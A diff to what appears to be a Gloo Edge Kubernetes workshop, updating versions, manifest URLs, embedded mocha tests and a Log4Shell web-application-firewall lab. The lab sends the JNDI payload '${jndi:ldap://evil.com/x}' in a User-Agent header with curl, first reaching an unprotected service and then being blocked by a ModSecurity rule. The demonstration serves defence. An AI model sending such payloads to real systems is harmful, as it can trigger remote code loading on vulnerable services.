@@ -74,14 +74,15 @@ There are many good reasons why.
 Why would you choose Gloo Edge?
 - It has been developed from the beginning with the idea to be configured 100% through yaml.
 - It provides all the functionalities you expect from a modern API Gateway:
-- External authentication based on OAuth2, JWT, api keys, …
-- Authorization based on OPA
-- Advanced rate-limiting
-- Web Application Firewall based on ModSecurity
-- Advanced transformation
-- Customization through Web Assembly
-- A Kubernetes-native developer portal called Gloo Portal
-- And much more
+    - External authentication based on OAuth2, JWT, api keys, ...
+    - Authorization based on OPA
+    - Advanced rate-limiting
+    - GraphQL capabilities at the edge such as discovery, automatic schema generation, schema stitching, ...
+    - Web Application Firewall based on ModSecurity
+    - Advanced transformation
+    - Customization through Web Assembly
+    - A Kubernetes-native developer portal called Gloo Portal
+    - And much more
 
 The above-mentioned features enable Platform Engineers as well as Development Teams to implement powerful mechanisms to manage and secure traffic, implement access control, transform requests and responses, and gain observability over their services.
 
@@ -131,8 +132,10 @@ describe("Required environment variables should contain value", () => {
   });
 });
 EOF
-echo "executing test gloo-edge/templates/steps/deploy-gloo-edge/tests/environment-variables.test.js.liquid"
-mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
+echo "executing test dist/edge-default/build/templates/steps/deploy-gloo-edge/tests/environment-variables.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
 -->
 
 Run the commands below to deploy the Gloo Edge Enterprise components:
@@ -140,14 +143,14 @@ Run the commands below to deploy the Gloo Edge Enterprise components:
 
 
 ```bash
-export GLOO_VERSION=v1.10.1
+export GLOO_VERSION=v1.12.8
 curl -sL https://run.solo.io/gloo/install | sh
 export PATH=$HOME/.gloo/bin:$PATH
 
 helm repo add glooe https://storage.googleapis.com/gloo-ee-helm
 helm repo update
 helm upgrade --install gloo glooe/gloo-ee --namespace gloo-system \
-  --create-namespace --version 1.10.1 --set-string license_key=$LICENSE_KEY --devel
+  --create-namespace --version 1.12.8 --set-string license_key=$LICENSE_KEY --devel
 ```
 
 <!--bash
@@ -172,8 +175,10 @@ describe("Check glooctl version", () => {
   });
 });
 EOF
-echo "executing test gloo-edge/templates/steps/deploy-gloo-edge/tests/glooctl-version.test.js.liquid"
-mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
+echo "executing test dist/edge-default/build/templates/steps/deploy-gloo-edge/tests/glooctl-version.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
 -->
 
 Use the following commands to wait for the Gloo Edge components to be deployed:
@@ -193,7 +198,7 @@ With the components up and running, we are ready to showcase Gloo Edge with prac
 
 ## Lab 3 - Traffic management <a name="Lab-3"></a>
 
-### Deploy Services
+## Deploy Services
 
 In this step, you will expose two services to the outside world using Gloo Edge.
 
@@ -204,22 +209,22 @@ Begin by creating a namespace and then deploy the service.
 ```bash
 kubectl create ns httpbin
 
-kubectl -n httpbin apply -f https://git.io/JyIRv
+kubectl -n httpbin apply -f https://raw.githubusercontent.com/solo-io/workshops/master/gloo-edge/data/httpbin.yaml
 ```
 
-We will additionally deploy the `echo` service. Which replies with a static text.
+We will additionally deploy the `echo` service, which replies with a static text.
 
 ```bash
 kubectl create ns echo
 
-kubectl -n echo apply -f https://git.io/JyIRn
+kubectl -n echo apply -f https://raw.githubusercontent.com/solo-io/workshops/master/gloo-edge/data/echo-service.yaml
 ```
 
 The currently deployed services are shown in the figure below.
 
 ![Gloo Edge with `httpbin` and the `echo` service](images/deployed-services.png)
 
-### Understanding the `Upstream` resource
+## Understanding the `Upstream` resource
 
 In Gloo Edge, an `Upstream` defines destinations where traffic can be routed. Upstreams tell Gloo Edge how to route traffic to the workloads behind it. Those workloads can be Kubernetes Services, aws EC2 instances, Lambda Functions, and so on.
 
@@ -274,8 +279,13 @@ glooctl get upstream
 
 The upstream resources are stored in the cluster as Kubernetes Custom Resources. You can query those using kubectl, as shown below:
 
+```bash
+kubectl get upstreams -n gloo-system
 ```
-kubectl get upstreams -n gloo-system 
+
+The response should look something like below. Notice both the `echo-echo-v1-8080` and `httpbin-httpbin-8000` upstreams that were discovered as part of this exercise.
+
+```
 NAME                                                   AGE
 default-kubernetes-443                                 28m
 echo-echo-v1-8080                                      5m3s
@@ -302,7 +312,7 @@ kube-system-kube-dns-9153                              28m
 rate-limit                                             28m
 ```
 
-### Using `VirtualServices` you can route traffic to an `Upstream`
+## Using `VirtualServices` you can route traffic to an `Upstream`
 
 `VirtualService` is another Custom Resource Definition created by Gloo Edge. Those configure the Envoy proxy to route traffic to upstreams. Because the upstreams are already created, all we need to do is expose and route traffic to those with a virtual service. 
 
@@ -341,7 +351,7 @@ On the web browser, you'll see the `httpbin` application webpage.
 
 ![`httpbin` Web Interface](images/httpbin-ui.png)
 
-Now, create another route entry for the `echo` service. But we got to ask ourselves on what property of the request should we take the routing decision? Gloo Edge is versatile and you can route based on many properties such as headers, hostname, path-based routing, and so on.
+Now, create another route entry for the `echo` service. First, let's consider what property of the request we should use to make the routing decision. Gloo Edge is versatile and you can route based on many properties such as headers, hostname, path-based routing, and so on.
 
 While surfing the web end-users will type the hostname in the web browser address bar, for e.g.  `echo.solo.io`. After that the browser uses Domain Name Servers (DNS) configured on the operating system to resolve the typed hostname to an IP address.
 
@@ -421,7 +431,7 @@ To test that the hostnames are resolved open chrome and instead of the IP use th
 
 And sure enough, you should see the static text "version-1".
 
-### Gloo Edge configuration to route traffic to a workload
+## Gloo Edge configuration to route traffic to a workload
 
 There are quite a few resources involved to route traffic to the upstream. Those are visualized in the figure below.
 
@@ -429,7 +439,7 @@ There are quite a few resources involved to route traffic to the upstream. Those
 
 We already got to know the `VirtualService` and the `Upstream` resource definitions.  So let's take a closer look at the `Gateway` resource. 
 
-### `Gateway` configures the proxy to admit traffic
+## `Gateway` configures the proxy to admit traffic
 
 The `Gateway` resource configures the proxy to admit traffic for an address and a port.
 
@@ -472,7 +482,7 @@ spec:
 
 This configures the proxy to admit traffic on port 8080 for all addresses. When checking the gateway `gateway-proxy-ssl` you'll see that it listens on port 8443 and additionally sets the ssl property to true.
 
-### Delegation
+## Delegation
 
 In the previous example, we set up a `VirtualService` that routes traffic to two different applications. Those applications might be operated by different teams. At the surface, this might seem fine, but it violates the isolation principle of multi-tenant environments. If one team makes changes to the `VirtualService` (such as prototyping with a new app), a misconfiguration of theirs can break the routing for the apps of other teams. 
 
@@ -549,7 +559,7 @@ EOF
 
 Breaking the route table from the virtual service enables the separation of concerns. Development teams can maintain the route table and configure properties specific for routing to their services. Meanwhile, administrators can define higher-level options. Such as firewall rules, authentication of requests, and so on.
 
-### Delegation By Label Selector
+## Delegation By Label Selector
 
 Another way to delegate is using labels. This approach helps you to create dynamic references thus you don't need to change the Virtual service for every new route table.
 
@@ -622,14 +632,14 @@ EOF
 
 Now teams within the `echo` namespace can create multiple route tables on how to route traffic to their services without making changes to the virtual service. You can try the same commands as previous and everything works the same.
 
-### Routing to Multiple Upstreams
+## Routing to Multiple Upstreams
 
 In many cases, you need to route traffic to two different versions of an application. Such as testing a new feature using A/B Testing, and so on. In this step, you are going to update the Virtual Service to route traffic to two different `Upstreams`. 
 
 Begin by creating a new deployment of the **echo** service (which represents another upstream), this time it returns the text `version-2`. Apply it to the cluster: 
 
 ```bash
-kubectl -n echo apply -f https://git.io/JyqPy
+kubectl -n echo apply -f https://raw.githubusercontent.com/solo-io/workshops/master/gloo-edge/data/echo-v2-service.yaml
 ```
 
 Verify that the upstream for the second version of the echo service is created.
@@ -717,7 +727,7 @@ version-1
 
 The output shows that the traffic is split across versions 1 and 2 of the echo app. This allows teams to gradually release traffic to a new version of an app, and such scopes the mishaps to only a small percentage of your users (in case there was something wrong with the new version of the service).
 
-> NOTE: The change was entirely done in the RouteTable. The RouteTable resided within the teams namespace. Thus in multi-tenant environments, other teams' are protected from the misconfigurations of each other.
+> NOTE: The change was entirely done in the RouteTable. The RouteTable resided within the team's namespace. Thus in multi-tenant environments, other teams are protected from the misconfigurations of each other.
 
 <!--bash
 cat <<'EOF' > ./test.js
@@ -735,8 +745,10 @@ describe("httpbin receives requests that don't specify the host header", () => {
 })
 
 EOF
-echo "executing test gloo-edge/templates/steps/traffic-management/tests/verify-routing.test.js.liquid"
-mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
+echo "executing test dist/edge-default/build/templates/steps/traffic-management/tests/verify-routing.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
 -->
 
 
@@ -746,9 +758,9 @@ mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
 
 
 
-In this step, you will explore some of the Gloo Edge features related to security and Authentication. 
+In this step, you will explore some of the Gloo Edge features related to security and authentication. 
 
-### Network Encryption - Server TLS
+## Network Encryption - Server TLS
 
 Traffic routes through many networking devices until it reaches the intended service. It is key for the traffic to be encrypted while traveling through these networking devices, and only the server should be able to decrypt and read the contents. For that reason, you need to secure your application using TLS.
 
@@ -839,13 +851,13 @@ Now the application is securely exposed through TLS. Open it in the browser usin
 
 If you've added the Root CA certificate to your browser you will see the green key in the address bar, which indicates that the authentication of the server succeeded and that the connection is encrypted and secure.
 
-Meanwhile, when you make requests using CURL, you either have to add the certificate to the system certs or specify it in the command as shown below.
+Use curl to invoke an https endpoint of the httpbin service, like the one below.
 
 ```
 curl https://httpbin.solo.io/get
 ```
 
-Besides authenticating the server another important authentication is of the client (or end-user) before he is permitted to query information or make changes.
+Besides authenticating the server, another important authentication is of the client (or end-user) before it is permitted to query information or make changes.
 
 <!--bash
 cat <<'EOF' > ./test.js
@@ -856,11 +868,13 @@ describe("httpbin is available (https)", () => {
 })
 
 EOF
-echo "executing test gloo-edge/templates/steps/security-and-authentication/tests/https.test.js.liquid"
-mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
+echo "executing test dist/edge-default/build/templates/steps/security-and-authentication/tests/https.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
 -->
 
-### Authentication with OIDC (OpenID Connect)
+## Authentication with OIDC (OpenID Connect)
 
 In many use cases, you need to restrict the access to your applications to only authenticated users. 
 
@@ -874,7 +888,7 @@ Let's start by installing Keycloak:
 
 ```bash
 kubectl create ns keycloak
-kubectl -n keycloak create -f https://git.io/Jyqye
+kubectl -n keycloak create -f https://raw.githubusercontent.com/solo-io/workshops/master/gloo-edge/data/keycloak.yaml
 kubectl -n keycloak rollout status deploy/keycloak
 ```
 
@@ -1053,18 +1067,20 @@ describe("Authentication is working properly", function() {
   let password = 'password';
   let keycloak_svc = chaiExec("kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
   let keycloak_client_id = chaiExec("kubectl -n gloo-system get authconfig oauth -o jsonpath='{.spec.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.oauth}'").stdout.replaceAll("'", "");
+  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
   let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii').split(' ')[1].trim();
+  let keycloak_client_secret = buff.toString('ascii');
   let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "http://' + keycloak_svc + ':8080/auth/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
   it('httpbin is accessible after authenticating', () => helpersHttp.checkURL({ host: "https://httpbin.solo.io/", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 200 }));
 });
 EOF
-echo "executing test gloo-edge/templates/steps/security-and-authentication/tests/authentication.test.js.liquid"
-mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
+echo "executing test dist/edge-default/build/templates/steps/security-and-authentication/tests/authentication.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
 -->
 
-### Refactor time
+## Refactor time
 
 If we configure one Virtual Service with all the hostnames and all the routing information it will quickly grow to a point that it is untenable.
 
@@ -1215,7 +1231,7 @@ Let's see how this impacts the application.
 ```
 /opt/google/chrome/chrome https://httpbin.solo.io/ 
 ```
-After logging in with `user1` / `password` you will be able to view the httbin UI. As well as send GET requests.
+After logging in with `user1` / `password` you will be able to view the httpbin UI. As well as send GET requests.
 
 However, when logging in with an administrator account (`admin1` / `password` credentials), you will be able to make POST requests too.
 
@@ -1236,9 +1252,9 @@ describe("user1 who is a regular user", function() {
   let password = 'password';
   let keycloak_svc = chaiExec("kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
   let keycloak_client_id = chaiExec("kubectl -n gloo-system get authconfig oauth -o jsonpath='{.spec.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.oauth}'").stdout.replaceAll("'", "");
+  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
   let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii').split(' ')[1].trim();
+  let keycloak_client_secret = buff.toString('ascii');
   let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "http://' + keycloak_svc + ':8080/auth/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
   
   it("is authorized to make GET requests", () => helpersHttp.checkWithMethod({ host: "https://httpbin.solo.io", path: "/get", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], method: "get", retCode: 200 }));
@@ -1251,16 +1267,18 @@ describe("admin1 who is an administrator", function() {
   let password = 'password';
   let keycloak_svc = chaiExec("kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
   let keycloak_client_id = chaiExec("kubectl -n gloo-system get authconfig oauth -o jsonpath='{.spec.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.oauth}'").stdout.replaceAll("'", "");
+  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
   let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii').split(' ')[1].trim();
+  let keycloak_client_secret = buff.toString('ascii');
   let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "http://' + keycloak_svc + ':8080/auth/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
   
   it("is authorized to make POST requests", () => helpersHttp.checkWithMethod({ host: "https://httpbin.solo.io", path: "/post", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], method: "post", retCode: 200 }));
 });
 EOF
-echo "executing test gloo-edge/templates/steps/opa-authorization/tests/authorization.test.js.liquid"
-mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
+echo "executing test dist/edge-default/build/templates/steps/opa-authorization/tests/authorization.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
 -->
 
 
@@ -1274,7 +1292,7 @@ The example that we will take in the labs that follow is to rate limit our users
 
 The information of the email and the subscription are present in the JWT tokens. So we need to use the request transformation capabilities of Gloo Edge to extract those claims and mount those into the request.
 
-### Extract JWT claims and store them in HTTP headers
+## Extract JWT claims and store them in HTTP headers
 
 To extract JWT claims and store those in the request headers we got to use the `jwtStaged` property. After authenticating the request this property can be configured to extract the token claims and store those as HTTP Headers. As shown below:
 
@@ -1354,7 +1372,7 @@ Your output too should contain the `X-Email`, `X-Subscription` headers.
 }
 ```
 
-### Staged transformations
+## Staged transformations
 
 We need another piece of information in the header and that is the organization. However, the organization is not stored as a claim in the user token. But on closer look, we find out that we can derive the organization from the email! Basically, `user1@acme.com` is a member of the ACME organization.
 
@@ -1473,9 +1491,9 @@ describe("The request is transformed", function() {
   let password = 'password';
   let keycloak_svc = chaiExec("kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
   let keycloak_client_id = chaiExec("kubectl -n gloo-system get authconfig oauth -o jsonpath='{.spec.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.oauth}'").stdout.replaceAll("'", "");
+  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
   let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii').split(' ')[1].trim();
+  let keycloak_client_secret = buff.toString('ascii');
   let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "http://' + keycloak_svc + ':8080/auth/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
   
   it("has added the X-Email header", () => helpersHttp.checkBody({ host: "https://httpbin.solo.io", path: "/get", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], body: "X-Email", retCode: 200 }));
@@ -1486,8 +1504,10 @@ describe("The request is transformed", function() {
 });
 
 EOF
-echo "executing test gloo-edge/templates/steps/request-transformation/tests/transformations.test.js.liquid"
-mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
+echo "executing test dist/edge-default/build/templates/steps/request-transformation/tests/transformations.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
 -->
 
 
@@ -1627,7 +1647,7 @@ You will see that on the 9th request you will see a 429 status code. Which stand
 
 ![Browser 429 Too Many Requests Interface](images/429.png)
 
-### Refactor time!
+## Refactor time!
 
 The VirtualService options can be extracted in their own resource called `VirtualHostOptions`. Usually, used when the same set of options has to be applied across different virtual services.
 
@@ -1734,9 +1754,9 @@ describe("The rate limit for free sub users", function() {
   let password = 'password';
   let keycloak_svc = chaiExec("kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
   let keycloak_client_id = chaiExec("kubectl -n gloo-system get authconfig oauth -o jsonpath='{.spec.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.oauth}'").stdout.replaceAll("'", "");
+  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
   let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii').split(' ')[1].trim();
+  let keycloak_client_secret = buff.toString('ascii');
   let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "http://' + keycloak_svc + ':8080/auth/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
   
   it("have only 2 requests per minute", () => {
@@ -1751,9 +1771,9 @@ describe("The rate limit for enterprise sub users", function() {
   let password = 'password';
   let keycloak_svc = chaiExec("kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
   let keycloak_client_id = chaiExec("kubectl -n gloo-system get authconfig oauth -o jsonpath='{.spec.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.oauth}'").stdout.replaceAll("'", "");
+  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
   let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii').split(' ')[1].trim();
+  let keycloak_client_secret = buff.toString('ascii');
   let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "http://' + keycloak_svc + ':8080/auth/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
   
   it("have only 8 requests per minute", () => {
@@ -1766,8 +1786,10 @@ describe("The rate limit for enterprise sub users", function() {
   });
 });
 EOF
-echo "executing test gloo-edge/templates/steps/rate-limiting/tests/subscription-based-rate-limit.test.js.liquid"
-mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
+echo "executing test dist/edge-default/build/templates/steps/rate-limiting/tests/subscription-based-rate-limit.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
 -->
 
 
@@ -1781,13 +1803,78 @@ Gloo Edge Enterprise includes the ability to enable the ModSecurity Web Applicat
 
 An example of how using Gloo Edge we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.
 
-### What is the Log4Shell vulnerability? 
+## What is the Log4Shell vulnerability? 
 
-The Log4Shell vulnerability impacted all java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit. 
+The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit. 
 
 Using the Web Application Firewall capabilities you can reject requests containing such headers. 
 
-Start by applying the virtual service to the cluster.
+## Demonstrate a vulnerable service
+
+Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That’s what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
+
+We'll first establish a virtual service that does NOT protect against the exploit, and evaluate it against the httpbin service we installed in earlier exercises.
+
+```bash
+cat <<'EOF' | envsubst | kubectl apply -f -
+apiVersion: gateway.solo.io/v1
+kind: VirtualService
+metadata:
+  name: vs-httpbin
+  namespace: gloo-system
+spec:
+  virtualHost:
+    domains:
+      - "httpbin.solo.io"
+    routes:
+      - matchers:
+          - prefix: /
+        routeAction:
+          single:
+            upstream:
+              name: httpbin-httpbin-8000
+              namespace: gloo-system
+EOF
+```
+
+We’ll simulate one of these attack vectors by passing our `evil.com` string in a request header to our gateway, and then see that request routed to the target service.
+
+We’ll use curl to simulate the attack, passing in the attack string as the value of the standard `User-Agent` header:
+
+```bash
+curl -H "User-Agent: \${jndi:ldap://evil.com/x}" http://httpbin.solo.io/anything -i
+```
+
+You should see a response that looks similar to the one below. Note that if the system under attack logged out its `User-Agent` header using log4j, then it could potentially be compromised.
+
+```
+HTTP/1.1 200 OK
+date: Mon, 13 Dec 2021 23:20:22 GMT
+content-type: application/json
+content-length: 444
+server: envoy
+access-control-allow-origin: *
+access-control-allow-credentials: true
+x-envoy-upstream-service-time: 41
+
+{
+  "args": {},
+  "data": "",
+  "files": {},
+  "form": {},
+  "headers": {
+    "Accept": "*/*",
+    "Host": "34.138.145.188",
+    "User-Agent": "${jndi:ldap://evil.com/x}",    <<< THIS IS BAD!!!
+    ...
+  }
+...
+}
+```
+
+## Protect the vulnerable service
+
+Now we will protect the httpbin service by applying a modified virtual service to the cluster, with a ModSecurity rule added that blocks input strings containing potential Log4Shell attacks.
 
 ```bash
 cat <<'EOF' | envsubst | kubectl apply -f -
@@ -1821,15 +1908,61 @@ spec:
 EOF
 ```
 
+Let’s examine briefly what this rule does. Line 1 identifies ModSec variables we want to match, entities like the `REQUEST_BODY` and `REQUEST_HEADERS`. These are entities where the contents might be logged by log4j when the request is received, so we want to be sure to protect them.
+
+Line 2 is the condition that is applied to the variables listed in Line 1. In this case, we’re matching against strings that begin with `${jndi`.
+
+Finally, Line 3 defines the action to be taken when the rule is matched. In this case, we are denying the request and passing back a `403 Forbidden` error code.
+
 Now, if you try to make a request containing a header that exploits this vulnerability the request will be rejected before reaching the service.
 
 ```bash
-curl -H "x-my-header: \${jndi:ldap://evil.com/x}" http://httpbin.solo.io/anything
+curl -H "User-Agent: \${jndi:ldap://evil.com/x}" http://httpbin.solo.io/anything -i
 ```
 
-For more information on the log4j vulnerability check our blog "[Block Log4Shell attacks with Gloo Edge](https://www.solo.io/blog/block-log4shell-attacks-with-gloo-edge/)".
+Since one of the REQUEST_HEADERS (`User-Agent`) contains a value that matches the regular expression in the ModSec rule, you should see the request rejected with a `403 Forbidden` error, like this:
 
-To learn about the WAF capabilities of Gloo Edge checkout "[Web Application Firewall - Gloo Edge Docs](https://docs.solo.io/gloo-edge/latest/guides/security/waf/)"
+```
+HTTP/1.1 403 Forbidden
+content-length: 27
+content-type: text/plain
+date: Mon, 13 Dec 2021 23:56:13 GMT
+server: envoy
+
+Log4Shell malicious payload
+```
+
+However, the same curl request with a proper `User-Agent` header would be accepted with no errors.
+
+```bash
+curl -H "User-Agent: curl/7.74.0" http://httpbin.solo.io/anything -i
+```
+
+Here's a snippet of the expected response:
+
+```
+HTTP/1.1 200 OK
+server: envoy
+date: Mon, 13 Dec 2021 23:59:34 GMT
+content-type: application/json
+content-length: 383
+...
+{
+  "args": {}, 
+  ...
+  "headers": {
+    ...
+    "User-Agent": "curl/7.74.0", 
+    ...
+  }, 
+  ...
+  "url": "http://httpbin.kubernetes.rmtxxkufojcx.instruqt.io/anything"
+}
+```
+
+For more information on the log4j vulnerability, check our blog "[Block Log4Shell attacks with Gloo Edge](https://www.solo.io/blog/block-log4shell-attacks-with-gloo-edge/)".
+
+To learn about the WAF capabilities of Gloo Edge check out "[Web Application Firewall - Gloo Edge Docs](https://docs.solo.io/gloo-edge/latest/guides/security/waf/)"
 
 <!--bash
 cat <<'EOF' > ./test.js
@@ -1842,8 +1975,10 @@ describe("Request should be blocked for jndi header", () => {
 });
 
 EOF
-echo "executing test gloo-edge/templates/steps/web-application-firewall/tests/firewall-block-agent.test.js.liquid"
-mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
+echo "executing test dist/edge-default/build/templates/steps/web-application-firewall/tests/firewall-block-agent.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
 -->
 
 
@@ -1851,7 +1986,7 @@ mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
 
 ## Lab 9 - Observability <a name="Lab-9"></a>
 
-### Metrics
+## Metrics
 
 Gloo Edge automatically generates a Grafana dashboard for whole-cluster stats (overall request timing, aggregated response codes, etc.), and dynamically generates a more-specific dashboard for each upstream that is tracked.
 
@@ -1879,7 +2014,7 @@ kubectl -n gloo-system get cm gloo-observability-config -o yaml
 
 If you want to customize how these per-upstream dashboards look, you can provide your template to use by writing a Grafana dashboard JSON representation to that config map key. 
 
-### Access Logging
+## Access Logging
 
 Access logs are important to check if a system is behaving correctly and for debugging purposes. Log aggregators like Datadog and Splunk use agents deployed on the Kubernetes clusters to collect logs.  
 
